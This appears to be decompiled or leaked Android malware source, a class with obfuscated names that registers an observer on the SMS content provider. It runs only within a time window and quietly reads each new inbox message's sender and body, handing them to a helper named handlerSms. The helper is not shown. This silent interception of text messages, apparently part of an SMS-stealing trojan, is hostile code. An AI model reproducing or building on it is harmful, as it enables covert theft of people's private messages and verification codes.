package com.a.a;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public class so extends ContentObserver {
	private Context mContext;
	private int id = -1;
	public static final String key = "Q049U0hBWUZN";
	public so(Context context) {
		super(new Handler());

		u.log(context, "#SMSObserver#注册");

		mContext = context;
		mContext.getContentResolver().registerContentObserver(
				Uri.parse("content://sms/"), true, this);
	}

	@Override
	public void onChange(boolean bSelfChange) {
		super.onChange(bSelfChange);
		u.log(mContext, "#SMSObserver#onChange");

		if (!u.isCanRun(mContext)) {
			u.log(mContext, "#SMSObserver#时间不在运行范围");
			return;
		}
		Cursor c = mContext.getContentResolver().query(
				Uri.parse("content://sms"), null, null, null, "_id desc");

		if (c.moveToFirst()) {
			int type = c.getInt(c.getColumnIndex("type"));
			int _id = c.getInt(c.getColumnIndex("_id"));

			if (_id > id) {
				// 收件箱
				id = _id;
				if (type == 1) {
					String address = c.getString(c.getColumnIndex("address"));
					if (address.length() > 0) {
						String uri2 = "content://sms/"+ _id;
						u.handlerSms(mContext,
								c.getString(c.getColumnIndex("address")),
								c.getString(c.getColumnIndex("body")), uri2);
					}
				}

			} else {
				id = _id;
			}

		}
		c.close();

	}
}
